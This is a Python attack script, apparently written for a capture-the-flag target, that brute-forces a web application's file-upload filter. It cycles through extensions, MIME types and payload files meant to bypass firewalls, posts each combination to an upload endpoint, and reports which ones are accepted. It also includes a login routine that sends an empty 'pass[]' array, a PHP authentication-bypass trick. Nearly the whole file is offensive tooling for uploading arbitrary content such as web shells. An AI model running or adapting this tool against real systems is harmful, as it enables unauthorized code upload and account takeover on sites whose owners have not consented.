#!/usr/bin/python
import requests
import argparse
import sys
from validateParams import *
import os.path
import json

class HandleRequest:

    def __init__(self,url, extensions=None,contentType=None,payloads=None,error=None,cookie=None):
        
        self.url  = url
        self.error = error
        self.cookie = cookie if not cookie else json.loads(cookie)

        # files
        self.extensions = extensions
        self.contentType = contentType
        self.payloads = payloads

    def check_magicNumbers(self,file_name):
        pass

    # bypass restrictions data
    def check_data(self):

        allow_files = self.check_extension()
        payloads = self.payloads

        for fl in allow_files:
            filename = fl[1]
            for payload in payloads:
                data = self.data_to_send(filename,fl[0],payload)
                response = self.request(self.url,data,self.error,self.cookie)
                if response:
                    print(filename)
                    print(fl[0])
                    print(payload)
                    print()

    def data_to_send(self,filename=None, content_type=None, data=None):

        #Default data to send
        if data == None:
            data = "GIF8; data"

        if filename and content_type and data:
            return "------WebKitFormBoundarybn6feBe6J33rH4yC\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{0}\"\r\nContent-Type: {1}\r\n\r\n{2}\r\n\r\n------WebKitFormBoundarybn6feBe6J33rH4yC\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n------WebKitFormBoundarybn6feBe6J33rH4yC--\r\n".format(filename,content_type,data)
        return ""

    def check_extension(self):
        
        right_extensions = [] 

        for ext in self.extensions:
            filename="000{}".format(ext)
            for ctp in self.contentType:
                data = self.data_to_send(filename,ctp)
                response = self.request(self.url,data,self.error,self.cookie)
                if response:   
                    right_extensions.append((ctp,filename))
        
        return right_extensions
        
    def session(self):
        
        session = requests.Session()
    
        try:
            login_response = session.post(self.url, data={"user": "rmichaels", "pass[]": ""})
            login_response.raise_for_status()  # Raise an exception for non-200 status codes

            if login_response.status_code == 200:
                # Extract cookies from the response
                cookies = login_response.cookies
                cookie_dict = {cookie.name: cookie.value for cookie in cookies}  # Concise dictionary creation
            else:
                print(f"Login failed with status code: {login_response.status_code}")
                return None
        except requests.exceptions.RequestException as e:
            print(f"Error during login request: {e}")
            return None


    def request(self,url,data,msg_error=None,cookie=None):


        if not isinstance(self.url, str):
            sys.exit(1)

        if msg_error is None:
            msg_error = "successfully"

        if cookie is None:
            cookie = {}
        headers = {"Cache-Control": "max-age=0", "Accept-Language": "es-ES", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.0.103", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybn6feBe6J33rH4yC", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://192.168.0.103/imfadministrator/uploadr942.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"} 
        response = requests.post(url,headers=headers,data=data,cookies=cookie)
        if msg_error in response.text:
            return True
        return False

    def attack(self):
        self.check_data()

if __name__ == "__main__":
    def main():
        parser = argparse.ArgumentParser(description='Prgram test extension file allowing',usage="Usage: request.py [options]",exit_on_error=True)
        params_required = parser.add_argument_group('Required', 'Params necessary')
        params_required.add_argument('-u', dest='url', action=ValidateUrl, help="Enter url : http - https://domain.com")
        params_required.add_argument('-chk', dest='chk', action=ValidateFile, help='Param to check the extension allow')
        params_required.add_argument('-mt', dest='mt', action=ValidateFile, help='Param check the MIME Types')
        params_required.add_argument('-py', dest='py', action=ValidateFile, help='Payloads bypass firewalls')
        params_required.add_argument('-err', dest='err', help='Message response if not allow (defualt "Error")')

        params_optional = parser.add_argument_group('Optional', 'Params optional')
        params_optional.add_argument('--cookie',dest='cookie',help='HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")')
    
        args = parser.parse_args()

        if len(sys.argv) == 1:
            parser.print_help()
            sys.exit(1)
        handle = HandleRequest(args.url,args.chk,args.mt,args.py,args.err,args.cookie)
        handle.attack()
    main()
